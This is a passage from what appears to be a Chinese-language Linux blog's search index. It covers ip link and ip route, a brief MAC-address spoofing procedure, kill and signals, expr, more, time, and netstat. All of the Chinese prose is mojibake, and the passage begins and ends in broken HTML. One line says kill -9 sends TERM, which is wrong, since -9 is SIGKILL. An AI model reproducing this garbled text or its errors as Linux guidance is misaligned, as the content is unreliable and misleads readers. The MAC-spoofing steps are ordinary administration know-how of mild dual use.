class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip link set dev eno1 down</span><br><span class="line">ip link set dev eno1 up</span><br></pre></td></tr></table></figure><h3 id="ä¿®æ”¹ç½‘å¡çš„-mac-åœ°å€">ä¿®æ”¹ç½‘å¡çš„ MAC åœ°å€</h3><p>å‘½ä»¤ï¼š<code>ip link set dev eno1 address XX:XX:XX:XX:XX:XX</code></p><h2 id="æ˜¾ç¤ºè·¯ç”±è¡¨">æ˜¾ç¤ºè·¯ç”±è¡¨</h2><p>å‘½ä»¤ï¼š <code>ip route</code></p><p>ä¸€èˆ¬å¸¸ç”¨å®ƒæ¥ä»£æ›¿ <code>netstat -rn</code> æˆ– <code>route</code>æŸ¥çœ‹ç½‘å…³åœ°å€ã€‚ è¾“å‡ºä¸­ <code>via</code>åé¢çš„åœ°å€å³ä¸ºç½‘å…³åœ°å€ï¼ˆå¤„äºéšç§è€ƒè™‘ï¼Œæˆ‘å°†å…¶ç”¨ xxx æ›¿æ¢äº†ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ip route</span></span><br><span class="line">default via xxx.xxx.xxx.xxx dev wlo1 proto dhcp metric 600</span><br><span class="line">10.252.248.0/21 dev wlo1 proto kernel scope link src 10.252.254.67 metric 600</span><br></pre></td></tr></table></figure><h2 id="æ˜¾ç¤º-arp-ç¼“å­˜æˆ–è€…-arp-è¡¨">æ˜¾ç¤º ARP ç¼“å­˜æˆ–è€… ARP è¡¨</h2><p><code>ip n</code> æˆ–è€… <code>ip neigh show</code></p><p>å¯ä»¥ç”¨æ¥ä»£æ›¿</p><h2 id="mac-æ¬ºéª—çš„æ“ä½œæµç¨‹">MAC æ¬ºéª—çš„æ“ä½œæµç¨‹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip link show eno1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># æ ¹æ®ä¸Šä¸€æ­¥çš„ç»“æœæŸ¥çœ‹ä½ çš„åŸ MAC åœ°å€ï¼Œå¹¶è®°å½•</span></span></span><br><span class="line">ip link set dev eno1 down</span><br><span class="line">ip link set dev eno1 address XX:XX:XX:XX:XX:XX</span><br><span class="line">ip link set dev eno1 up</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><a href="https://linuxize.com/post/linux-ip-command/">Linux ipCommand with Examples</a> <ahref="https://www.it-swarm.asia/zh/ip/%20%e4%b8%80%e4%b8%aa%e7%bd%91%e5%8d%a1%e5%8f%af%e4%bb%a5%e6%9c%892%e4%b8%aaip%e5%9c%b0%e5%9d%80%e5%90%97%ef%bc%9f/960518481/">ä¸€ä¸ªç½‘å¡å¯ä»¥æœ‰2 ä¸ª IP åœ°å€å—ï¼Ÿ</a> <ahref="https://www.jianshu.com/p/c3278e44ee9d">å¤šç½‘å¡åŒ IP å’ŒåŒç½‘å¡å¤š IPæŠ€æœ¯</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
            <tag> iproute2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kill å‘½ä»¤</title>
      <link href="/blog/2020/07/13/linux/tools/kill_cmd/"/>
      <url>/blog/2020/07/13/linux/tools/kill_cmd/</url>
      
        <content type="html"><![CDATA[<h2 id="kill-command"><code>kill</code> Command</h2><p><code>kill</code> æ˜¯å¤§å¤šæ•° Bourne-derived shellsï¼Œè¯¸å¦‚ï¼šbashã€zsh ç­‰shell çš„å†…ç½®å‘½ä»¤ã€‚ shell å†…ç½®ç‰ˆå’Œ <code>/bin/kill</code>ç‹¬ç«‹å¯æ‰§è¡Œæ–‡ä»¶ç‰ˆçš„ killï¼Œåœ¨è¡Œä¸ºæœ‰äº›ä¸åŒã€‚</p><p>ä½¿ç”¨ <code>type</code> å‘½ä»¤æ˜¾ç¤ºä½ ç³»ç»Ÿä¸ŠåŒ…å« <code>kill</code>çš„æ‰€æœ‰ä½ç½®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">type</span> -a <span class="built_in">kill</span></span></span><br><span class="line">kill is a shell builtin</span><br><span class="line">kill is /usr/bin/kill</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šçš„è¾“å‡ºè¯´æ˜ shellå†…ç½®å‘½ä»¤æ¯”ç‹¬ç«‹å¯æ‰§è¡Œæ–‡ä»¶å…·æœ‰è¾ƒé«˜çš„ä¼˜å…ˆçº§ã€‚å½“ä½ è¾“å…¥ <code>kill</code>é»˜è®¤ä½¿ç”¨å‰è€…ï¼Œå¦‚æœä½ æƒ³è¦ä½¿ç”¨äºŒè¿›åˆ¶ç‰ˆï¼ˆåè€…ï¼‰ï¼Œé‚£ä½ éœ€è¦è¾“å…¥æ–‡ä»¶çš„å…¨è·¯å¾„<code>/usr/bin/kill</code> ï¼ˆ/usrç›®å½•ä¸‹è¡¨æ˜æ˜¯ç”¨æˆ·çš„ï¼Œå¦åˆ™æ˜¯ç³»ç»Ÿçš„ï¼‰ã€‚æœ¬æ–‡å°†è®¨è®ºé»˜è®¤ç”¨çš„ Bash å†…ç½®ç‰ˆçš„kill</p><h2 id="syntax">syntax</h2><p><code>kill [OPTIONS] [PID]...</code></p><p><code>kill</code>å‘½ä»¤å‘é€ä¸€ä¸ªä¿¡å·åˆ°åˆ¶å®šçš„è¿›ç¨‹æˆ–è€…è¿›ç¨‹ç»„ï¼Œä½¿å®ƒä»¬æ ¹æ®ä¿¡å·æ¥è¡ŒåŠ¨ã€‚å½“æ²¡æŒ‡å®šä¿¡å·æ—¶ï¼Œé»˜è®¤ä½¿ç”¨ <code>-15</code> ï¼ˆ-TERMï¼‰</p><p>ä½¿ç”¨ <code>kill -l</code> å¯ä»¥å¾—åˆ°æ‰€æœ‰å¯ç”¨çš„ä¿¡å·çš„åˆ—è¡¨, å»ºè®®ä½ ä½¿ç”¨<code>kill -l|sed "s/ /\n/g"|nl</code> ï¼Œ è¿™æ ·æˆ‘ä»¬å¯ä»¥çœ‹åºå·ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">kill</span> -l</span></span><br><span class="line">HUP INT QUIT ILL TRAP ABRT BUS FPE KILL USR1 SEGV USR2 PIPE ALRM TERM STKFLT CHLD CONT STOP TSTP TTIN TTOU URG XCPU XFSZ VTALRM PROF WINCH POLL PWR SYS</span><br></pre></td></tr></table></figure><p>ä¿¡å·å¯ä»¥é€šè¿‡ 3 ç§æ–¹å¼æŒ‡å®šï¼š</p><ol type="1"><li>Using number (e.g., <code>-1</code> or <code>-s 1</code>).</li><li>Using the "SIG" prefix (e.g., <code>-SIGHUP</code> or<code>-s SIGHUP</code>).</li><li>Without the "SIG" prefix (e.g., <code>-HUP</code> or<code>-s HUP</code>).</li></ol><p>ä¸‹é¢çš„æŒ‡ä»¤æ˜¯ç­‰ä»·çš„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kill -1 PID_NUMBER</span><br><span class="line">kill -SIGHUP PID_NUMBER</span><br><span class="line">kill -HUP PID_NUMBER</span><br></pre></td></tr></table></figure><h2 id="å¸¸è§ä¿¡å·">å¸¸è§ä¿¡å·</h2><p>linux è¿›ç¨‹ä¹Ÿæœ‰ä¸‰ç§æ–¹å¼æ¥å¤„ç†æ”¶åˆ°çš„ä¿¡å·ï¼š</p><ol type="1"><li>å¿½ç•¥ä¿¡å·ï¼Œå³å¯¹ä¿¡å·ä¸åšä»»ä½•å¤„ç†ï¼Œå…¶ä¸­ï¼Œæœ‰ä¸¤ä¸ªä¿¡å·ä¸èƒ½å¿½ç•¥ï¼šSIGKILL åŠSIGSTOPï¼›</li><li>æ•æ‰ä¿¡å·ã€‚å®šä¹‰ä¿¡å·å¤„ç†å‡½æ•°ï¼Œå½“ä¿¡å·å‘ç”Ÿæ—¶ï¼Œæ‰§è¡Œç›¸åº”çš„å¤„ç†å‡½æ•°ï¼›</li><li>æ‰§è¡Œç¼ºçœæ“ä½œï¼ŒLinux å¯¹æ¯ç§ä¿¡å·éƒ½è§„å®šäº†é»˜è®¤æ“ä½œã€‚</li></ol><p>Linuxè¿›ç¨‹å¯¹å®æ—¶ä¿¡å·çš„ç¼ºçœååº”æ˜¯è¿›ç¨‹ç»ˆæ­¢ã€‚ä½†æ˜¯å¯¹äºé«˜æ€§èƒ½æœåŠ¡å™¨ç¼–ç¨‹æ¥è¯´ï¼Œè¿™æ˜¯è‡´å‘½çš„ç¼ºé™·ï¼Œå¯¹äºè¿™ç±»æœåŠ¡å™¨éœ€è¦ä¿è¯åœ¨æ”¶åˆ°å„ç§ä¿¡å·åä»ç„¶å¯ä»¥å¯é è¿è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ç†è§£å„ç§ä¿¡å·çš„ç¼˜ç”±å’Œæ­£ç¡®çš„å¤„ç†æ–¹å¼ã€‚</p><p>SIGHUP å’Œæ§åˆ¶å°æ“ä½œæœ‰å…³ï¼Œå½“æ§åˆ¶å°è¢«å…³é—­æ—¶ç³»ç»Ÿä¼šå‘æ‹¥æœ‰æ§åˆ¶å° sessionIDçš„æ‰€æœ‰è¿›ç¨‹å‘é€ HUP ä¿¡å·ï¼Œé»˜è®¤ HUP ä¿¡å·çš„ action æ˜¯exitï¼Œå¦‚æœè¿œç¨‹ç™»é™†å¯åŠ¨æŸä¸ªæœåŠ¡è¿›ç¨‹å¹¶åœ¨ç¨‹åºè¿è¡Œæ—¶å…³é—­è¿æ¥çš„è¯ä¼šå¯¼è‡´æœåŠ¡è¿›ç¨‹é€€å‡ºï¼Œæ‰€ä»¥ä¸€èˆ¬æœåŠ¡è¿›ç¨‹éƒ½ä¼šç”¨nohup å·¥å…·å¯åŠ¨(è¯¥å‘½ä»¤å°±æ˜¯è®©å¿½ç•¥è¯¥ä¿¡å·)æˆ–å†™æˆä¸€ä¸ª daemon(åˆ©ç”¨ setsidè¿›è¡Œ)ã€‚</p><ol start="0" type="1"><li><code>SIGHUP</code></li></ol><blockquote><p>The SIGHUP signal is sent to a process when its controlling terminalis closed. It was originally designed to notify the process of a serialline drop (a hangup). In modern systems, this signal usually means thatthe controlling pseudo or virtual terminal has been closed. Many daemonswill reload their configuration files and reopen their logfiles insteadof exiting when receiving this signal. <code>nohup</code> is a commandto make a command ignore the signal.</p></blockquote><ol type="1"><li><p><code>SIGINT</code> ç»ˆæ­¢è¿›ç¨‹ï¼Œé€šå¸¸æˆ‘ä»¬çš„ Ctrl+Cå°±å‘é€çš„è¿™ä¸ªæ¶ˆæ¯ã€‚Ctrl+C ç»ˆæ­¢å‰å°è¿›ç¨‹</p></li><li><p><code>SIGQUIT</code> å’Œ SIGINT ç±»ä¼¼, ä½†ç”± QUIT å­—ç¬¦(é€šå¸¸æ˜¯ Ctrl-/ )æ¥æ§åˆ¶. è¿›ç¨‹æ”¶åˆ°è¯¥æ¶ˆæ¯é€€å‡ºæ—¶ä¼šäº§ç”Ÿ core æ–‡ä»¶ã€‚</p></li><li><p><code>SIGKILL</code> æ¶ˆæ¯ç¼–å·ä¸º 9ï¼Œæˆ‘ä»¬ç»å¸¸ç”¨ kill -9æ¥æ€æ­»è¿›ç¨‹å‘é€çš„å°±æ˜¯è¿™ä¸ªæ¶ˆæ¯ï¼Œç¨‹åºæ”¶åˆ°è¿™ä¸ªæ¶ˆæ¯ç«‹å³æ— æ¡ä»¶ç»ˆæ­¢ï¼Œè¿™ä¸ªæ¶ˆæ¯ä¸èƒ½è¢«æ•è·ï¼Œå°é”æˆ–è€…å¿½ç•¥ï¼Œæ‰€ä»¥æ˜¯æ€æ­»è¿›ç¨‹çš„ç»ˆææ­¦å™¨ã€‚</p></li><li><p><code>SIGTERM</code> æ˜¯ä¸å¸¦å‚æ•°æ—¶ kill é»˜è®¤å‘é€çš„ä¿¡å·ï¼Œé»˜è®¤æ˜¯Gracefully stop a process.ï¼ˆå…ˆå…³é—­å’Œå…¶æœ‰å…³çš„ç¨‹åºï¼Œå†å°†å…¶å…³é—­ï¼‰</p></li><li><p><code>SIGTSTP</code></p><blockquote><p>The SIGTSTP signal is sent to a process by its controlling terminalto request it to stop (terminal stop). It is commonly initiated by theuser pressing <code>Ctrl+z</code>. Unlike SIGSTOP, the process canregister a signal handler for, or ignore, the signal.</p></blockquote><p>å¯ä»¥ä½¿ç”¨ <code>jobs</code> æŸ¥çœ‹åå°å‘½ä»¤ï¼Œä½¿ç”¨ <code>fg</code>å°†å¯¹åº”åºå·æŒ‚èµ·çš„è¿›ç¨‹è°ƒå›å‰å°.</p></li><li><p>SIGCONT</p><blockquote><p>The SIGCONT signal instructs the operating system to continue(restart) a process previously paused by the SIGSTOP or SIGTSTP signal.One important use of this signal is in job control in the Unixshell.</p></blockquote><p>é™¤äº†å…¶ä»–ç›®çš„ï¼Œ<code>SIGSTOP</code> å’Œ <code>SIGCONT</code> ç”¨äº Unixshell ä¸­çš„ä½œä¸šæ§åˆ¶ï¼Œæ— æ³•æ•è·æˆ–å¿½ç•¥ <code>SIGCONT</code> ä¿¡å·ã€‚</p></li></ol><h2 id="ä½¿ç”¨-kill-ç»ˆæ­¢å‘½ä»¤">ä½¿ç”¨ <code>kill</code> ç»ˆæ­¢å‘½ä»¤</h2><h3 id="kill-ä»»æ„è¿›ç¨‹">kill ä»»æ„è¿›ç¨‹</h3><p>è¦ç»ˆæ­¢ä¸€ä¸ªè¿›ç¨‹ï¼Œé¦–å…ˆéœ€è¦å®ƒçš„è¿›ç¨‹ idï¼Œ ä¹Ÿå°±æ˜¯ PIDã€‚ä½ å¯ä»¥ä½¿ç”¨<code>top, ps, pidofï¼Œpgrep</code> ç­‰è¯¸å¤šå‘½ä»¤ã€‚</p><p>æˆ‘ä¸€èˆ¬å¸¸ç”¨ä¸‰ä¸ªï¼š 1. å¦‚æœæ˜¯çœ‹å†…å­˜å ç”¨ç­‰ï¼Œä¸€èˆ¬å…ˆè¿è¡Œ<code>htop</code>,ç„¶åæ‰¾åˆ° PID 2.å¦‚æœåªæ˜¯è¦æ€æ­»æŸè°¢ç‰¹å®šçš„è¿›ç¨‹ï¼Œä½¿ç”¨(æ³¨æ„ å¯ç”¨ tab é”®è¡¥å…¨è¦æ‰¾çš„åå­—) 1.<code>ps aux|grep firefox</code> 2. <code>pidof firefox</code></p><p>ç„¶åå†ç”¨ kill é€šè¿‡å‘é€ <code>TERM</code> ä¿¡å·æ— æ¡ä»¶æ€æ­»è¿™äº›è¿›ç¨‹<code>kill -9 PID</code></p><h3 id="kill-åå°ä»»åŠ¡è¿›ç¨‹">kill åå°ä»»åŠ¡è¿›ç¨‹</h3><p>é€šè¿‡ <code>jobs</code> å‘½ä»¤æŸ¥çœ‹ job å·ï¼ˆå‡è®¾ä¸º numï¼‰ï¼Œç„¶åæ‰§è¡Œ<code>kill %num</code>. å¦‚æœåªæœ‰ä¸€ä¸ªåå°ä»»åŠ¡çš„åŒ–ï¼Œé‚£å°±æ˜¯<code>kill %1</code> ç›´æ¥ä¸Š</p><h2 id="æ€»ç»“">æ€»ç»“</h2><p><code>kill</code>å‘½ä»¤é€šå¸¸ç”¨æ¥å‘è¿›ç¨‹å‘é€ä¿¡å·ï¼Œæœ€å¸¸ç”¨çš„ä¿¡å·æ˜¯ï¼š<code>SIGKILL</code> æˆ–<code>-9</code> ,å³ï¼šæ— æ¡ä»¶ç»ˆæ­¢è¿›ç¨‹ã€‚</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><a href="https://linuxize.com/post/kill-command-in-linux/">KillCommand in Linux</a></p><p><a href="https://en.wikipedia.org/wiki/Signal_(IPC)">Signal (IPC)wiki</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kill </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux ä¸€äº›å®ç”¨å°å‘½ä»¤</title>
      <link href="/blog/2020/07/13/linux/tools/little_cmds/"/>
      <url>/blog/2020/07/13/linux/tools/little_cmds/</url>
      
        <content type="html"><![CDATA[<h2 id="echo">echo</h2><ol type="1"><li><p>echoå‘½ä»¤å¯ç”¨å•å¼•å·æˆ–åŒå¼•å·æ¥åˆ’å®šæ–‡æœ¬å­—ç¬¦ä¸²ã€‚å¦‚æœåœ¨å­—ç¬¦ä¸²ä¸­ç”¨åˆ°äº†å®ƒä»¬ï¼Œä½ éœ€è¦åœ¨æ–‡æœ¬ä¸­ä½¿ç”¨å…¶ä¸­ä¸€ç§å¼•å·ï¼Œè€Œç”¨å¦å¤–ä¸€ç§æ¥å°†å­—ç¬¦ä¸²åˆ’å®šèµ·æ¥</p></li><li><p>å¦‚æœæƒ³æŠŠæ–‡æœ¬å­—ç¬¦ä¸²å’Œå‘½ä»¤è¾“å‡ºæ˜¾ç¤ºåœ¨åŒä¸€è¡Œä¸­ï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿå¯ä»¥ç”¨<code>echo</code>è¯­å¥çš„<code>-n</code>å‚æ•°</p><p><code>-nï¼šdo not output the trailing newline</code></p><p>ä¾‹å¦‚ï¼š</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo -n &quot;The time and date are:&quot;</span><br><span class="line">date</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="expr">expr</h2><h3 id="ä»‹ç»">ä»‹ç»</h3><p>expr å‘½ä»¤æ˜¯ä¸€ä¸ªæ‰‹å·¥å‘½ä»¤è¡Œè®¡æ•°å™¨ï¼Œç”¨äºåœ¨ UNIX/LINUXä¸‹æ±‚è¡¨è¾¾å¼å˜é‡çš„å€¼ï¼Œä¸€èˆ¬ç”¨äºæ•´æ•°å€¼ï¼Œä¹Ÿå¯ç”¨äºå­—ç¬¦ä¸²ã€‚</p><p><code>expr è¡¨è¾¾å¼</code></p><p>è¡¨è¾¾å¼è¯´æ˜:</p><ul><li><strong>ç”¨ç©ºæ ¼éš”å¼€æ¯ä¸ªé¡¹</strong>;</li><li><strong>ç”¨ <code>\</code> (åæ–œæ ) æ”¾åœ¨ shellç‰¹å®šçš„å­—ç¬¦å‰é¢</strong>;</li><li>å¯¹åŒ…å«ç©ºæ ¼å’Œå…¶ä»–ç‰¹æ®Šå­—ç¬¦çš„å­—ç¬¦ä¸²è¦ç”¨å¼•å·æ‹¬èµ·æ¥;</li><li><code>expr</code> ä¼šè¾“å‡ºç»“æœï¼Œæ‰€ä»¥ä¸ç”¨å†å•ç‹¬ <code>echo</code></li></ul><h3 id="ä½¿ç”¨">ä½¿ç”¨</h3><p>1ã€è®¡ç®—å­—ä¸²é•¿åº¦ <code>expr length å­—ç¬¦ä¸²</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">expr</span> length <span class="string">&quot;this  is a test&quot;</span></span></span><br><span class="line">14</span><br></pre></td></tr></table></figure><p>2ã€æŠ“å–å­—ä¸² <code>expr substr å­—ç¬¦ä¸² start_index length</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">expr</span> substr <span class="string">&quot;this  is a test&quot;</span>  3  5</span></span><br><span class="line">is  is</span><br></pre></td></tr></table></figure><p>3ã€æŠ“å–ç¬¬ä¸€ä¸ªå­—ç¬¦æ•°å­—ä¸²å‡ºç°çš„ä½ç½®<code>expr index å­—ç¬¦ä¸² å­—ç¬¦</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">expr</span> index <span class="string">&quot;sarasara&quot;</span> a</span></span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>4ã€æ•´æ•°è¿ç®— <code>%ï¼Œ *ï¼Œ /ï¼Œ+ï¼Œ -</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">expr</span> 30 \* 3 (ä½¿ç”¨ä¹˜å·æ—¶ï¼Œå¿…é¡»ç”¨åæ–œçº¿å±è”½å…¶ç‰¹å®šå«ä¹‰ã€‚å› ä¸ºshellå¯èƒ½ä¼šè¯¯è§£æ˜¾ç¤ºæ˜Ÿå·çš„æ„ä¹‰)</span></span><br><span class="line">90</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="built_in">expr</span> 30 * 3</span></span><br><span class="line">expr: Syntax error</span><br></pre></td></tr></table></figure><h2 id="more">more</h2><p>moreå‘½ä»¤ç”¨äºåœ¨å‘½ä»¤æç¤ºç¬¦ä¸­æŸ¥çœ‹æ–‡æœ¬æ–‡ä»¶ï¼Œæ¯æ¬¡æ˜¾ç¤ºä¸€ä¸ªå±å¹•ï¼Œä»¥é˜²æ–‡ä»¶è¾ƒå¤§(ä¾‹å¦‚æ—¥å¿—æ–‡ä»¶)ã€‚</p><p>ä½¿ç”¨ï¼š</p><ol type="1"><li>ç›´æ¥åŠ æ–‡ä»¶å‚æ•° <code>more filename</code></li><li>ç®¡é“ ä¾‹å¦‚ï¼šcat filename|nl|more</li></ol><p>å¸¸ç”¨å¿«æ·é”®ï¼š</p><p><code>q</code> é€€å‡º <code>space</code> æ˜¾ç¤ºåé¢ kè¡Œæ–‡æœ¬ï¼Œé»˜è®¤ä¸ºå½“å‰å±å¹•å¤§å°ã€‚ <code>b æˆ–è€… ctrl+b</code>å›é€€ä¸€å±æ–‡å­—ï¼Œ<strong>æ³¨æ„</strong>ï¼šæ­¤å¿«æ·é”®åªåœ¨ä¸æ–‡ä»¶ä½¿ç”¨æ—¶èµ·ä½œç”¨ï¼Œä¾‹å¦‚ï¼š<code>more filename</code>ï¼Œè€Œä¸ç®¡é“ä½¿ç”¨æ—¶æ— ä½œç”¨ã€‚</p><h2 id="last">last</h2><p>è¯¥å‘½ä»¤ç”¨æ¥åˆ—å‡ºç›®å‰ä¸è¿‡å»ç™»å½•ç³»ç»Ÿçš„ç”¨æˆ·ç›¸å…³ä¿¡æ¯ã€‚æŒ‡ä»¤è‹±æ–‡åŸä¹‰ï¼šshowlisting of last logged in users.</p><h2 id="time">time</h2><p>æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶æµ‹è¯•ç»™å‡ºç‰¹å®šæŒ‡ä»¤æ‰§è¡Œæ—¶æ‰€éœ€æ¶ˆè€—çš„æ—¶é—´åŠç³»ç»Ÿèµ„æºç­‰ timeæŒ‡ä»¤å¯ä»¥æ˜¾ç¤ºçš„èµ„æºæœ‰å››å¤§é¡¹ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><ol type="1"><li>Time resources</li><li>Memory resources</li><li>IO resources</li><li>Command info</li></ol><p>ä¾‹å¦‚ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">time <span class="built_in">date</span></span></span><br><span class="line">Sat 01 Aug 2020 03:41:58 PM CST</span><br><span class="line">date  0.00s user 0.00s system 80% cpu 0.001 total</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><a href="https://www.runoob.com/linux/linux-comm-time.html">Linuxtime å‘½ä»¤</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Check for Listening Ports</title>
      <link href="/blog/2020/07/13/linux/tools/netstat_lsof/"/>
      <url>/blog/2020/07/13/linux/tools/netstat_lsof/</url>
      
        <content type="html"><![CDATA[<h2 id="netstat">netstat</h2><h3 id="ç®€ä»‹">ç®€ä»‹</h3><p>ç”± <code>man netstat</code> å¾—:</p><blockquote><p>netstat - Print network connections, routing tables, interfacestatistics, masquerade connections, and multicast memberships</p></blockquote><h3 id="ä½¿ç”¨">ä½¿ç”¨</h3><p>å¸¸è§å‚æ•°</p><ol type="1"><li><p>-a é€‰é¡¹ä¼šåˆ—å‡º tcp, udp å’Œ unix åè®®ä¸‹æ‰€æœ‰å¥—æ¥å­—çš„æ‰€æœ‰è¿æ¥ã€‚</p><p><code>netstat -a</code></p></li><li><p>åªåˆ—å‡º TCP æˆ– UDP åè®®çš„è¿æ¥</p><p>ä½¿ç”¨ -t é€‰é¡¹åˆ—å‡º TCP åè®®çš„è¿æ¥ï¼Œå¯å’Œ -a é€‰é¡¹é…åˆä½¿ç”¨<code>netstat -at</code> ä½¿ç”¨ -u é€‰é¡¹åˆ—å‡º UDP åè®®çš„è¿æ¥<code>netstat -au</code></p></li><li><p>ç¦ç”¨åå‘åŸŸåè§£æï¼ŒåŠ å¿«æŸ¥è¯¢é€Ÿåº¦</p><p>é»˜è®¤æƒ…å†µä¸‹ netstat ä¼šé€šè¿‡åå‘åŸŸåè§£ææŸ¥æ‰¾æ¯ä¸ª IPåœ°å€å¯¹åº”çš„ä¸»æœºåï¼Œä¼šé™ä½æŸ¥æ‰¾é€Ÿåº¦ã€‚n é€‰é¡¹å¯ä»¥ç¦ç”¨æ­¤è¡Œä¸ºï¼Œå¹¶ä¸”ç”¨æˆ· IDå’Œç«¯å£å·ä¹Ÿä¼˜å…ˆä½¿ç”¨æ•°å­—æ˜¾ç¤ºã€‚ <code>netstat -na</code></p></li><li><p>åªåˆ—å‡ºç›‘å¬ä¸­çš„è¿æ¥ <code>-l</code>é€‰é¡¹å¯ä»¥åªåˆ—å‡ºæ­£åœ¨ç›‘å¬çš„è¿æ¥ï¼ˆä¸èƒ½å’Œ a é€‰é¡¹åŒæ—¶ä½¿ç”¨ï¼‰</p><p><code>netstat -nl</code></p></li><li><p>è·å–è¿›ç¨‹åã€è¿›ç¨‹å·ä»¥åŠç”¨æˆ· ID <code>-p</code>é€‰é¡¹å¯ä»¥æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ï¼ˆæ­¤æ—¶ netstat åº”å°½é‡è¿è¡Œåœ¨ rootæƒé™ä¹‹ä¸‹ï¼Œå¦åˆ™ä¸èƒ½å¾—åˆ°è¿è¡Œåœ¨ root æƒé™ä¸‹çš„è¿›ç¨‹åï¼‰</p><p><code>netstat -np</code></p></li><li><p>æ˜¾ç¤ºè·¯ç”±ä¿¡æ¯ ä½¿ç”¨ <code>-r</code> é€‰é¡¹æ‰“å°å†…æ ¸è·¯ç”±ä¿¡æ¯ï¼Œä¸ routeå‘½ä»¤è¾“å‡ºä¸€æ ·ã€‚ <code>netstat -rn</code></p></li><li><p>ç½‘ç»œæ¥å£ä¿¡æ¯ <code>-i</code>é€‰é¡¹å¯ä»¥è¾“å‡ºç½‘ç»œæ¥å£è®¾å¤‡çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œç»“åˆä¸Š <code>-e</code> é€‰é¡¹ï¼Œç­‰äº<code>ifconfig</code> å‘½ä»¤çš„è¾“å‡ºã€‚</p></li><li><p>è·å–ç½‘ç»œåè®®çš„ç»Ÿè®¡ä¿¡æ¯ <code>-s</code>é€‰é¡¹å¯ä»¥è¾“å‡ºé’ˆå¯¹ä¸åŒç½‘ç»œåè®®çš„ç»Ÿè®¡ä¿¡æ¯ï¼ŒåŒ…æ‹¬ Ipã€Icmpã€Tcp å’Œ Udpç­‰ã€‚</p></li></ol><h3 id="åº”ç”¨">åº”ç”¨</h3><ol type="1"><li><p>æŸ¥çœ‹ç½‘å…³è·¯ç”±å™¨åœ°å€</p><p><code>netstat -rn</code> ç›¸å½“äº <code>route -n</code></p></li><li><p>æ‰¾å‡ºç¨‹åºè¿è¡Œçš„ç«¯å£ä¸ PID</p><p>åœ¨ç”¨æˆ·æƒé™ä¸‹ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„è¿›ç¨‹éƒ½èƒ½æ‰¾åˆ°ï¼Œæ²¡æœ‰æƒé™çš„ä¼šä¸æ˜¾ç¤ºã€‚éœ€è¦ä½¿ç”¨root æƒé™æŸ¥çœ‹æ‰€æœ‰çš„ä¿¡æ¯ã€‚<code>sudo netstat -nap | grep ssh</code></p></li><li><p>è§£é™¤ç«¯å£å ç”¨ï¼ˆæ€æ­»å ç”¨ç«¯å£çš„ç¨‹åºï¼‰<code>netstat -nap|grep ç«¯å£</code> <code>kill -9 PID</code></p></li></ol><h2 id="ss-å‘½ä»¤">ss 